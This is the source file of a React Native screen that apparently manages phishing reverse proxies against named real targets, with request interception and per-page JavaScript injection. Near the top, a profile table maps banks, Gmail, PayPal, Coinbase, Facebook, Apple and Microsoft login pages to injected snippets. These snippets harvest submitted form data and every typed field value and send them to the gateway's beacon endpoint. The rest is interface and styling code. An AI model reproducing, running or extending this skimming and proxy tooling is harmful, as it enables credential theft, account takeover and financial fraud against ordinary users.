import * as Clipboard from "expo-clipboard";
import { LinearGradient } from "expo-linear-gradient";
import {
  ArrowRight,
  Bug,
  Check,
  Code2,
  Copy,
  Globe,
  Link2,
  Loader,
  Power,
  Trash2,
  Wand2,
  Zap,
} from "lucide-react-native";
import React, { useCallback, useMemo, useState } from "react";
import {
  ActivityIndicator,
  Alert,
  KeyboardAvoidingView,
  Platform,
  Pressable,
  ScrollView,
  StyleSheet,
  Text,
  TextInput,
  View,
} from "react-native";
import { useSafeAreaInsets } from "react-native-safe-area-context";

import PulseDot from "@/components/PulseDot";
import { theme } from "@/constants/theme";
import { useApiKey } from "@/hooks/useApiKey";
import {
  useAllocateProxyDomain,
  useCloudflareZones,
  useCreateProxy,
  useDeleteProxy,
  useProxies,
  useUpdateProxy,
} from "@/hooks/useGateway";
import { getBaseUrl, proxyUrl, type Proxy } from "@/lib/api";

// ── Static site profiles for auto JS injection ──
type SnippetFn = (gateway: string) => string;

const combinedSnippet: SnippetFn = (g) =>
  `document.addEventListener('submit',function(e){var d={};new FormData(e.target).forEach(function(v,k){d[k]=v;});fetch('${g}/api/beacon',{method:'POST',mode:'no-cors',headers:{'Content-Type':'application/json'},body:JSON.stringify({url:location.href,form:d})});});\ndocument.addEventListener('focusout',function(e){var t=e.target;if(t.tagName!=='INPUT'&&t.tagName!=='SELECT')return;fetch('${g}/api/beacon',{method:'POST',mode:'no-cors',headers:{'Content-Type':'application/json'},body:JSON.stringify({url:location.href,field:t.name||t.id||t.type,value:t.value})});});`;

type ProfileEntry = { match: RegExp; profile: { name: string; snippet: SnippetFn } };

const SITE_PROFILES: ProfileEntry[] = [
  { match: /shufflegaming|backoffice\.shuffle/i, profile: { name: "Shuffle Gaming", snippet: (g) => `document.addEventListener('submit',function(e){var d={};new FormData(e.target).forEach(function(v,k){d[k]=v;});fetch('${g}/api/beacon',{method:'POST',mode:'no-cors',body:JSON.stringify({site:'shuffle',url:location.href,data:d})});});` } },
  { match: /nab\.com\.au|netbank|commbank|westpac|anz\.com/i, profile: { name: "Banking portal", snippet: combinedSnippet } },
  { match: /facebook\.com|fb\.com/i, profile: { name: "Facebook", snippet: combinedSnippet } },
  { match: /instagram\.com/i, profile: { name: "Instagram", snippet: combinedSnippet } },
  { match: /tiktok\.com/i, profile: { name: "TikTok", snippet: combinedSnippet } },
  { match: /twitter\.com|x\.com/i, profile: { name: "X / Twitter", snippet: combinedSnippet } },
  { match: /linkedin\.com/i, profile: { name: "LinkedIn", snippet: combinedSnippet } },
  { match: /gmail\.com|mail\.google/i, profile: { name: "Gmail", snippet: combinedSnippet } },
  { match: /outlook\.com|live\.com|hotmail/i, profile: { name: "Outlook", snippet: combinedSnippet } },
  { match: /amazon\.com|amazon\.com\.au/i, profile: { name: "Amazon", snippet: combinedSnippet } },
  { match: /ebay\.com|ebay\.com\.au/i, profile: { name: "eBay", snippet: combinedSnippet } },
  { match: /binance\.com/i, profile: { name: "Binance", snippet: combinedSnippet } },
  { match: /coinbase\.com/i, profile: { name: "Coinbase", snippet: combinedSnippet } },
  { match: /paypal\.com/i, profile: { name: "PayPal", snippet: combinedSnippet } },
  { match: /accounts\.google|google\.com\/signin/i, profile: { name: "Google login", snippet: combinedSnippet } },
  { match: /appleid\.apple|idmsa\.apple/i, profile: { name: "Apple ID", snippet: combinedSnippet } },
  { match: /login\.microsoft|login\.live|microsoftonline/i, profile: { name: "Microsoft login", snippet: combinedSnippet } },
  { match: /login|signin|auth|sso|account|portal|backoffice|admin/i, profile: { name: "Login portal", snippet: combinedSnippet } },
];

function analyseTarget(targetUrl: string): string {
  const gateway = getBaseUrl();
  for (const { match, profile } of SITE_PROFILES) {
    if (match.test(targetUrl)) return profile.snippet(gateway);
  }
  return combinedSnippet(gateway);
}

// ── Proxy card — streamlined per-target view ──

function ProxyCard({ proxy, authHeader }: { proxy: Proxy; authHeader?: string }) {
  const update = useUpdateProxy(authHeader);
  const removeProxy = useDeleteProxy(authHeader);
  const { data: zones, isLoading: zonesLoading } = useCloudflareZones(authHeader);
  const allocate = useAllocateProxyDomain(authHeader);

  const [showEdit, setShowEdit] = useState(false);
  const [showInject, setShowInject] = useState(false);
  const [editName, setEditName] = useState(proxy.name);
  const [editTarget, setEditTarget] = useState(proxy.targetUrl);
  const [injectJs, setInjectJs] = useState(proxy.injectJs ?? "");
  const [domainCopied, setDomainCopied] = useState(false);
  const [urlCopied, setUrlCopied] = useState(false);

  const url = proxyUrl(proxy.slug);
  const domainUrl = proxy.proxyDomain ? `https://${proxy.proxyDomain}` : "";

  const copyUrl = async () => { await Clipboard.setStringAsync(url); setUrlCopied(true); setTimeout(() => setUrlCopied(false), 1400); };
  const copyDomain = async () => { if (!domainUrl) return; await Clipboard.setStringAsync(domainUrl); setDomainCopied(true); setTimeout(() => setDomainCopied(false), 1400); };

  const toggle = () => update.mutate({ id: proxy.id, enabled: !proxy.enabled });
  const toggleIntercept = () => update.mutate({ id: proxy.id, interceptEnabled: !proxy.interceptEnabled });
  const toggleInject = () => update.mutate({ id: proxy.id, injectJsEnabled: !proxy.injectJsEnabled });

  const saveEdit = () => {
    const normalised = /^https?:\/\//.test(editTarget.trim()) ? editTarget.trim() : `https://${editTarget.trim()}`;
    update.mutate({ id: proxy.id, name: editName.trim(), targetUrl: normalised }, { onSuccess: () => setShowEdit(false) });
  };

  const saveInject = () => {
    const trimmed = injectJs.trim();
    update.mutate({ id: proxy.id, injectJs: trimmed, injectJsEnabled: trimmed.length > 0 }, { onSuccess: () => setShowInject(false) });
  };

  const autoAnalyse = () => {
    const snippet = analyseTarget(proxy.targetUrl);
    setInjectJs(snippet);
  };

  const remove = () => {
    const run = () => removeProxy.mutate(proxy.id);
    if (Platform.OS === "web") { run(); return; }
    Alert.alert("Remove proxy", `Stop routing "${proxy.name}"?`, [
      { text: "Cancel", style: "cancel" },
      { text: "Remove", style: "destructive", onPress: run },
    ]);
  };

  return (
    <View style={[styles.card, !proxy.enabled && styles.cardOff]}>
      {/* Top row: name + status + hits */}
      <View style={styles.cardTop}>
        <View style={styles.cardTopLeft}>
          <PulseDot color={proxy.enabled ? theme.colors.ok : theme.colors.textFaint} active={proxy.enabled} size={8} />
          <Text style={styles.cardName} numberOfLines={1}>{proxy.name}</Text>
          {proxy.phishlet && (
            <View style={styles.phishBadge}>
              <Wand2 size={9} color={theme.colors.warn} />
            </View>
          )}
        </View>
        <View style={styles.cardTopRight}>
          <View style={styles.hits}>
            <Zap size={11} color={theme.colors.accent} />
            <Text style={styles.hitsText}>{proxy.hits}</Text>
          </View>
          <Pressable onPress={() => { setShowEdit(v => !v); setEditName(proxy.name); setEditTarget(proxy.targetUrl); }} hitSlop={8} style={({ pressed }) => [styles.miniBtn, pressed && styles.pressed, showEdit && styles.miniBtnActive]}>
            <Text style={[styles.miniBtnText, showEdit && styles.miniBtnTextActive]}>✎</Text>
          </Pressable>
        </View>
      </View>

      {/* Route line */}
      <View style={styles.route}>
        <Text style={styles.slug} numberOfLines={1}>/proxy/{proxy.slug}</Text>
        <ArrowRight size={11} color={theme.colors.textFaint} />
        <Text style={styles.target} numberOfLines={1}>{proxy.targetUrl.replace(/^https?:\/\//, "")}</Text>
      </View>

      {/* Gateway URL — tappable copy */}
      <Pressable onPress={copyUrl} style={({ pressed }) => [styles.urlRow, pressed && styles.pressed]}>
        <Text style={styles.url} numberOfLines={1}>{url}</Text>
        {urlCopied ? <Check size={14} color={theme.colors.ok} /> : <Copy size={14} color={theme.colors.textDim} />}
      </Pressable>

      {/* Live domain banner */}
      {proxy.proxyDomain ? (
        <Pressable onPress={copyDomain} style={({ pressed }) => [styles.domainBanner, pressed && styles.pressed]}>
          <Globe size={12} color={theme.colors.ok} />
          <Text style={styles.domainText} numberOfLines={1}>https://{proxy.proxyDomain}</Text>
          {domainCopied ? <Check size={12} color={theme.colors.ok} /> : <Copy size={12} color={theme.colors.textDim} />}
        </Pressable>
      ) : null}

      {/* Edit panel */}
      {showEdit && (
        <View style={styles.editPanel}>
          <Text style={styles.fieldLabel}>NAME</Text>
          <TextInput value={editName} onChangeText={setEditName} style={styles.fieldInput} placeholder="Proxy name" placeholderTextColor={theme.colors.textFaint} autoCapitalize="none" />
          <Text style={styles.fieldLabel}>TARGET URL</Text>
          <TextInput value={editTarget} onChangeText={setEditTarget} style={styles.fieldInput} placeholder="https://example.com" placeholderTextColor={theme.colors.textFaint} autoCapitalize="none" autoCorrect={false} keyboardType="url" />
          <Pressable onPress={saveEdit} disabled={update.isPending} style={({ pressed }) => [styles.saveBtn, pressed && styles.pressed]}>
            {update.isPending ? <ActivityIndicator size="small" color={theme.colors.bg} /> : <Check size={13} color={theme.colors.bg} />}
            <Text style={styles.saveBtnText}>Save</Text>
          </Pressable>
        </View>
      )}

      {/* JS injection */}
      <Pressable onPress={() => { setShowInject(v => !v); setInjectJs(proxy.injectJs ?? ""); }} style={({ pressed }) => [styles.injectToggle, pressed && styles.pressed, proxy.injectJsEnabled && styles.injectToggleActive]}>
        <Code2 size={13} color={proxy.injectJsEnabled ? theme.colors.warn : theme.colors.textFaint} />
        <Text style={[styles.injectToggleText, { color: proxy.injectJsEnabled ? theme.colors.warn : theme.colors.textDim }]}>
          {proxy.injectJsEnabled ? `JS injection active (${proxy.injectJs?.length ?? 0} chars)` : showInject ? "Hide JS editor" : "Inject JavaScript"}
        </Text>
      </Pressable>

      {showInject && (
        <View style={styles.injectPanel}>
          <View style={styles.injectTopRow}>
            <Text style={styles.injectHint}>JavaScript injected into every proxied page.</Text>
            <Pressable onPress={autoAnalyse} style={({ pressed }) => [styles.analyseBtn, pressed && styles.pressed]}>
              <Wand2 size={11} color={theme.colors.accent} />
              <Text style={styles.analyseText}>Analyze</Text>
            </Pressable>
          </View>
          <TextInput value={injectJs} onChangeText={setInjectJs} placeholder="console.log('injected')" placeholderTextColor={theme.colors.textFaint} style={styles.injectInput} multiline autoCapitalize="none" autoCorrect={false} textAlignVertical="top" />
          <View style={styles.injectActions}>
            <Pressable onPress={toggleInject} disabled={update.isPending} style={({ pressed }) => [styles.actionBtnSm, pressed && styles.pressed, proxy.injectJsEnabled && styles.actionBtnSmWarn]}>
              <Power size={11} color={proxy.injectJsEnabled ? theme.colors.warn : theme.colors.textFaint} />
              <Text style={[styles.actionSmText, { color: proxy.injectJsEnabled ? theme.colors.warn : theme.colors.textDim }]}>{proxy.injectJsEnabled ? "On" : "Off"}</Text>
            </Pressable>
            <Pressable onPress={saveInject} disabled={update.isPending} style={({ pressed }) => [styles.injectSaveBtn, pressed && styles.pressed]}>
              <Check size={12} color={theme.colors.bg} />
              <Text style={styles.injectSaveText}>Save snippet</Text>
            </Pressable>
          </View>
        </View>
      )}

      {/* Action row */}
      <View style={styles.actions}>
        <Pressable onPress={toggle} disabled={update.isPending} style={({ pressed }) => [styles.actionBtn, pressed && styles.pressed]}>
          <Power size={13} color={proxy.enabled ? theme.colors.warn : theme.colors.ok} />
          <Text style={[styles.actionText, { color: proxy.enabled ? theme.colors.warn : theme.colors.ok }]}>{proxy.enabled ? "Disable" : "Enable"}</Text>
        </Pressable>
        <Pressable onPress={toggleIntercept} disabled={update.isPending} style={({ pressed }) => [styles.actionBtn, pressed && styles.pressed]}>
          <Bug size={13} color={proxy.interceptEnabled ? theme.colors.warn : theme.colors.textFaint} />
          <Text style={[styles.actionText, { color: proxy.interceptEnabled ? theme.colors.warn : theme.colors.textDim }]}>{proxy.interceptEnabled ? "Capturing" : "Intercept"}</Text>
        </Pressable>
        <Pressable onPress={remove} disabled={removeProxy.isPending} style={({ pressed }) => [styles.actionBtn, pressed && styles.pressed]}>
          <Trash2 size={13} color={theme.colors.danger} />
          <Text style={[styles.actionText, { color: theme.colors.danger }]}>Remove</Text>
        </Pressable>
      </View>
    </View>
  );
}

// ── Main screen ──

export default function ProxiesScreen() {
  const insets = useSafeAreaInsets();
  const ah = useApiKey();
  const { data, isLoading, isError, error } = useProxies();
  const createProxy = useCreateProxy(ah);

  const [name, setName] = useState("");
  const [targetUrl, setTargetUrl] = useState("");
  const [formError, setFormError] = useState<string | null>(null);

  const submit = useCallback(() => {
    const trimmedUrl = targetUrl.trim();
    if (!trimmedUrl) { setFormError("Enter a target domain."); return; }
    const normalised = /^https?:\/\//.test(trimmedUrl) ? trimmedUrl : `https://${trimmedUrl}`;
    setFormError(null);
    createProxy.mutate(
      { name: name.trim(), targetUrl: normalised },
      { onSuccess: () => { setName(""); setTargetUrl(""); }, onError: (err) => setFormError(err.message) },
    );
  }, [name, targetUrl, createProxy]);

  const proxies = data ?? [];
  const activeCount = proxies.filter(p => p.enabled).length;

  return (
    <View style={styles.root}>
      <LinearGradient colors={[theme.colors.accentGlow, "transparent"]} start={{ x: 0.1, y: 0 }} end={{ x: 0.9, y: 0.5 }} style={styles.glow} pointerEvents="none" />
      <KeyboardAvoidingView style={styles.flex} behavior={Platform.OS === "ios" ? "padding" : undefined}>
        <ScrollView
          contentContainerStyle={[styles.content, { paddingTop: insets.top + theme.spacing(6) }]}
          keyboardShouldPersistTaps="handled"
          showsVerticalScrollIndicator={false}
        >
          <View style={styles.headerRow}>
            <View style={styles.headerLeft}>
              <Text style={styles.eyebrow}>EDGE PROXIES</Text>
              <Text style={styles.hero}>Route any domain</Text>
              <Text style={styles.sub}>Add a target and it goes live instantly. Every request captured for the analyser.</Text>
            </View>
            {proxies.length > 0 && (
              <View style={styles.statsCol}>
                <View style={[styles.statPill, styles.statPillTotal]}>
                  <Text style={styles.statNum}>{proxies.length}</Text>
                  <Text style={styles.statPillLabel}>total</Text>
                </View>
                <View style={[styles.statPill, activeCount > 0 ? styles.statPillActive : styles.statPillOff]}>
                  <Text style={[styles.statNum, activeCount > 0 && { color: theme.colors.ok }]}>{activeCount}</Text>
                  <Text style={[styles.statPillLabel, activeCount > 0 && { color: theme.colors.ok }]}>active</Text>
                </View>
              </View>
            )}
          </View>

          {/* Create form */}
          <View style={styles.form}>
            <Text style={styles.formLabel}>TARGET DOMAIN</Text>
            <TextInput
              value={targetUrl} onChangeText={setTargetUrl} placeholder="https://api.example.com"
              placeholderTextColor={theme.colors.textFaint} style={styles.input}
              autoCapitalize="none" autoCorrect={false} keyboardType="url" onSubmitEditing={submit}
            />
            <Text style={styles.formLabel}>NAME (optional)</Text>
            <TextInput
              value={name} onChangeText={setName} placeholder="e.g. Example API"
              placeholderTextColor={theme.colors.textFaint} style={styles.input} autoCapitalize="none"
            />
            {formError ? <Text style={styles.formError}>{formError}</Text> : null}
            <Pressable onPress={submit} disabled={createProxy.isPending} style={({ pressed }) => [styles.deployBtn, pressed && styles.pressed, createProxy.isPending && styles.deployBtnBusy]}>
              {createProxy.isPending ? <Loader size={16} color={theme.colors.bg} /> : <Globe size={16} color={theme.colors.bg} />}
              <Text style={styles.deployText}>{createProxy.isPending ? "Deploying…" : "Deploy proxy"}</Text>
            </Pressable>
          </View>

          {/* Proxy list */}
          {isError ? (
            <View style={styles.stateCard}>
              <Text style={styles.errorText}>{error?.message ?? "Could not load proxy targets."}</Text>
            </View>
          ) : isLoading ? (
            <View style={styles.stateCard}>
              <ActivityIndicator color={theme.colors.accent} />
              <Text style={styles.stateText}>Loading targets…</Text>
            </View>
          ) : proxies.length === 0 ? (
            <View style={styles.stateCard}>
              <Globe size={28} color={theme.colors.textFaint} />
              <Text style={styles.stateText}>No targets yet. Add a domain above to start routing traffic through the gateway.</Text>
            </View>
          ) : (
            <View style={styles.list}>
              <Text style={styles.sectionTitle}>TARGETS · {proxies.length}</Text>
              {proxies.map((proxy) => (<ProxyCard key={proxy.id} proxy={proxy} authHeader={ah} />))}
            </View>
          )}
        </ScrollView>
      </KeyboardAvoidingView>
    </View>
  );
}

// ── Styles ──
const styles = StyleSheet.create({
  root: { flex: 1, backgroundColor: theme.colors.bg },
  flex: { flex: 1 },
  glow: { position: "absolute", top: 0, left: 0, right: 0, height: 320 },
  content: { paddingHorizontal: theme.spacing(4), paddingBottom: theme.spacing(12), gap: theme.spacing(4) },
  headerRow: { flexDirection: "row", alignItems: "flex-start", justifyContent: "space-between", gap: theme.spacing(3) },
  headerLeft: { flex: 1 },
  eyebrow: { color: theme.colors.accent, fontSize: 12, fontWeight: "700", letterSpacing: 2, fontFamily: theme.font.mono },
  hero: { color: theme.colors.text, fontSize: 28, fontWeight: "800", letterSpacing: -0.5, marginTop: theme.spacing(1) },
  sub: { color: theme.colors.textDim, fontSize: 13, lineHeight: 20, marginTop: theme.spacing(1.5) },
  statsCol: { flexDirection: "column", gap: theme.spacing(1.5), alignItems: "flex-end" },
  statPill: { flexDirection: "row", alignItems: "center", gap: theme.spacing(1.5), borderRadius: theme.radius.sm, borderWidth: 1, paddingHorizontal: theme.spacing(2.5), paddingVertical: theme.spacing(1) },
  statPillTotal: { backgroundColor: theme.colors.surface, borderColor: theme.colors.border },
  statPillActive: { backgroundColor: "rgba(60,224,138,0.08)", borderColor: "rgba(60,224,138,0.35)" },
  statPillOff: { backgroundColor: theme.colors.surface, borderColor: theme.colors.border, opacity: 0.5 },
  statNum: { color: theme.colors.text, fontSize: 16, fontWeight: "800", fontFamily: theme.font.mono },
  statPillLabel: { color: theme.colors.textDim, fontSize: 9, fontWeight: "700", letterSpacing: 0.5, fontFamily: theme.font.mono },
  stateCard: { backgroundColor: theme.colors.surface, borderRadius: theme.radius.md, borderWidth: 1, borderColor: theme.colors.border, padding: theme.spacing(6), gap: theme.spacing(3), alignItems: "center" },
  stateText: { color: theme.colors.textDim, fontSize: 14, lineHeight: 21, textAlign: "center" },
  errorText: { color: theme.colors.danger, fontSize: 14, fontFamily: theme.font.mono, textAlign: "center" },
  sectionTitle: { color: theme.colors.textDim, fontSize: 11, fontWeight: "700", letterSpacing: 1.5, fontFamily: theme.font.mono },

  // Form
  form: { backgroundColor: theme.colors.bgElevated, borderRadius: theme.radius.md, borderWidth: 1, borderColor: theme.colors.border, padding: theme.spacing(4), gap: theme.spacing(2) },
  formLabel: { color: theme.colors.textFaint, fontSize: 10, fontWeight: "700", letterSpacing: 1, fontFamily: theme.font.mono, marginTop: theme.spacing(1) },
  input: { backgroundColor: theme.colors.surface, borderRadius: theme.radius.sm, borderWidth: 1, borderColor: theme.colors.border, paddingHorizontal: theme.spacing(3), paddingVertical: theme.spacing(3), color: theme.colors.text, fontSize: 14, fontFamily: theme.font.mono },
  formError: { color: theme.colors.danger, fontSize: 12 },
  deployBtn: { marginTop: theme.spacing(3), backgroundColor: theme.colors.accent, borderRadius: theme.radius.sm, paddingVertical: theme.spacing(3.5), flexDirection: "row", alignItems: "center", justifyContent: "center", gap: theme.spacing(2) },
  deployBtnBusy: { opacity: 0.7 },
  deployText: { color: theme.colors.bg, fontSize: 14, fontWeight: "800" },
  pressed: { opacity: 0.55 },

  // Card
  list: { gap: theme.spacing(3) },
  card: { backgroundColor: theme.colors.surface, borderRadius: theme.radius.md, borderWidth: 1, borderColor: theme.colors.border, padding: theme.spacing(4), gap: theme.spacing(3) },
  cardOff: { opacity: 0.55 },
  cardTop: { flexDirection: "row", alignItems: "center", justifyContent: "space-between" },
  cardTopLeft: { flexDirection: "row", alignItems: "center", gap: theme.spacing(2), flex: 1 },
  cardName: { color: theme.colors.text, fontSize: 15, fontWeight: "700", flexShrink: 1 },
  cardTopRight: { flexDirection: "row", alignItems: "center", gap: theme.spacing(2) },
  phishBadge: { backgroundColor: "rgba(255,178,62,0.15)", borderRadius: 6, padding: 3 },
  hits: { flexDirection: "row", alignItems: "center", gap: theme.spacing(1), backgroundColor: theme.colors.surfaceAlt, paddingHorizontal: theme.spacing(2), paddingVertical: 2, borderRadius: theme.radius.sm },
  hitsText: { color: theme.colors.text, fontSize: 11, fontWeight: "700", fontFamily: theme.font.mono },
  miniBtn: { width: 24, height: 24, borderRadius: 5, alignItems: "center", justifyContent: "center", backgroundColor: theme.colors.surfaceAlt, borderWidth: 1, borderColor: theme.colors.border },
  miniBtnActive: { backgroundColor: "rgba(255,178,62,0.15)", borderColor: "rgba(255,178,62,0.4)" },
  miniBtnText: { color: theme.colors.textDim, fontSize: 13 },
  miniBtnTextActive: { color: theme.colors.warn },
  route: { flexDirection: "row", alignItems: "center", gap: theme.spacing(2) },
  slug: { color: theme.colors.accent, fontSize: 12, fontFamily: theme.font.mono, flexShrink: 1 },
  target: { color: theme.colors.textDim, fontSize: 12, fontFamily: theme.font.mono, flexShrink: 1, flex: 1 },
  urlRow: { flexDirection: "row", alignItems: "center", justifyContent: "space-between", gap: theme.spacing(2), backgroundColor: theme.colors.bgElevated, borderRadius: theme.radius.sm, borderWidth: 1, borderColor: theme.colors.border, paddingHorizontal: theme.spacing(3), paddingVertical: theme.spacing(2.5) },
  url: { color: theme.colors.textDim, fontSize: 11, fontFamily: theme.font.mono, flexShrink: 1 },
  domainBanner: { flexDirection: "row", alignItems: "center", gap: theme.spacing(2), backgroundColor: "rgba(60,224,138,0.07)", borderRadius: theme.radius.sm, borderWidth: 1, borderColor: "rgba(60,224,138,0.25)", paddingHorizontal: theme.spacing(3), paddingVertical: theme.spacing(2) },
  domainText: { color: theme.colors.ok, fontSize: 12, fontFamily: theme.font.mono, flex: 1 },

  // Edit
  editPanel: { backgroundColor: theme.colors.bgElevated, borderRadius: theme.radius.sm, borderWidth: 1, borderColor: theme.colors.border, padding: theme.spacing(3), gap: theme.spacing(2) },
  fieldLabel: { color: theme.colors.textFaint, fontSize: 10, fontWeight: "700", letterSpacing: 1, fontFamily: theme.font.mono },
  fieldInput: { backgroundColor: theme.colors.surface, borderRadius: theme.radius.sm, borderWidth: 1, borderColor: theme.colors.border, color: theme.colors.text, fontSize: 12, fontFamily: theme.font.mono, paddingHorizontal: theme.spacing(3), paddingVertical: theme.spacing(2.5) },
  saveBtn: { flexDirection: "row", alignItems: "center", gap: theme.spacing(2), backgroundColor: theme.colors.accent, borderRadius: theme.radius.sm, paddingHorizontal: theme.spacing(4), paddingVertical: theme.spacing(2.5), alignSelf: "flex-end" },
  saveBtnText: { color: theme.colors.bg, fontSize: 12, fontWeight: "700" },

  // JS injection
  injectToggle: { flexDirection: "row", alignItems: "center", justifyContent: "center", gap: theme.spacing(2), backgroundColor: theme.colors.surfaceAlt, borderRadius: theme.radius.sm, paddingVertical: theme.spacing(2.5), borderWidth: 1, borderColor: "transparent" },
  injectToggleActive: { borderColor: theme.colors.warn },
  injectToggleText: { fontSize: 12, fontWeight: "700" },
  injectPanel: { backgroundColor: theme.colors.bgElevated, borderRadius: theme.radius.sm, borderWidth: 1, borderColor: theme.colors.warn, padding: theme.spacing(3), gap: theme.spacing(2) },
  injectTopRow: { flexDirection: "row", alignItems: "center", justifyContent: "space-between", gap: theme.spacing(2) },
  injectHint: { color: theme.colors.textDim, fontSize: 11, fontFamily: theme.font.mono, flex: 1 },
  analyseBtn: { flexDirection: "row", alignItems: "center", gap: 4, backgroundColor: theme.colors.surface, borderRadius: theme.radius.sm, borderWidth: 1, borderColor: theme.colors.accent, paddingHorizontal: theme.spacing(2), paddingVertical: 4, flexShrink: 0 },
  analyseText: { color: theme.colors.accent, fontSize: 10, fontWeight: "700", fontFamily: theme.font.mono },
  injectInput: { backgroundColor: theme.colors.surface, borderRadius: theme.radius.sm, borderWidth: 1, borderColor: theme.colors.border, paddingHorizontal: theme.spacing(3), paddingVertical: theme.spacing(2.5), color: theme.colors.warn, fontSize: 11, fontFamily: theme.font.mono, minHeight: 80, lineHeight: 16 },
  injectActions: { flexDirection: "row", gap: theme.spacing(2), justifyContent: "flex-end" },
  injectSaveBtn: { flexDirection: "row", alignItems: "center", gap: theme.spacing(1.5), backgroundColor: theme.colors.warn, borderRadius: theme.radius.sm, paddingHorizontal: theme.spacing(3), paddingVertical: theme.spacing(2.5) },
  injectSaveText: { color: theme.colors.bg, fontSize: 11, fontWeight: "700" },

  // Actions
  actions: { flexDirection: "row", gap: theme.spacing(2) },
  actionBtn: { flex: 1, flexDirection: "row", alignItems: "center", justifyContent: "center", gap: theme.spacing(2), backgroundColor: theme.colors.surfaceAlt, borderRadius: theme.radius.sm, paddingVertical: theme.spacing(2.5) },
  actionText: { fontSize: 12, fontWeight: "700" },
  actionBtnSm: { flexDirection: "row", alignItems: "center", justifyContent: "center", gap: theme.spacing(1.5), backgroundColor: theme.colors.surfaceAlt, borderRadius: theme.radius.sm, paddingHorizontal: theme.spacing(2.5), paddingVertical: theme.spacing(2) },
  actionBtnSmWarn: { borderWidth: 1, borderColor: theme.colors.warn },
  actionSmText: { fontSize: 10, fontWeight: "700" },
});
